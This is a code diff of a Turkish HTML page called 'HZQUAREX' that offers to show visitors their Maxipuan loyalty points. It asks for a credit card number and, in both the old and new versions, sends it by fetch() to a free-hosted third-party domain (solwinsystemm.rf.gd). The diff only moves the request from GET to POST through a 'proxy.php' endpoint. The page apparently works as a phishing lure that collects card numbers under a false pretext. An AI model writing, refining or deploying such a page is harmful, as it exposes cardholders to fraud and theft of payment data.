@@ -1,36 +1,41 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>HZQUAREX</title>
 </head>
-<body style="font-family: Arial; text-align: center; padding: 30px;">
+<body style="font-family: Arial; text-align: center; padding: 20px;">
   <h1>HZQUAREX</h1>
-  <p>Kart numaranızı girin, Maxipuan'ınızı görün</p>
+  <p>Kart numaranızı girin, Maxipuan'ı öğrenin</p>
 
-  <input type="text" id="cardInput" placeholder="Kredi kartı numarası" />
-  <button onclick="getPoints()">Maxipuanı Getir</button>
+  <input type="text" id="cardInput" placeholder="Kart numarası">
+  <button onclick="getPoints()">Maxipuan Sorgula</button>
 
   <p id="result" style="margin-top: 20px; font-weight: bold;"></p>
 
   <script>
     function getPoints() {
       const card = document.getElementById("cardInput").value;
-      const resultEl = document.getElementById("result");
       if (!card) {
-        resultEl.innerText = "Lütfen kart numarası girin.";
+        document.getElementById("result").innerText = "Lütfen kart numarası girin.";
         return;
       }
 
-      fetch("https://solwinsystemm.rf.gd/api.php?card=" + card)
-        .then((res) => res.text())
-        .then((data) => {
-          resultEl.innerText = "Maxipuan: " + data;
-        })
-        .catch(() => {
-          resultEl.innerText = "Bir hata oluştu.";
-        });
+      fetch("https://solwinsystemm.rf.gd/proxy.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "card=" + encodeURIComponent(card)
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.getElementById("result").innerText = data;
+      })
+      .catch(err => {
+        document.getElementById("result").innerText = "Bir hata oluştu: " + err;
+      });
     }
   </script>
 </body>
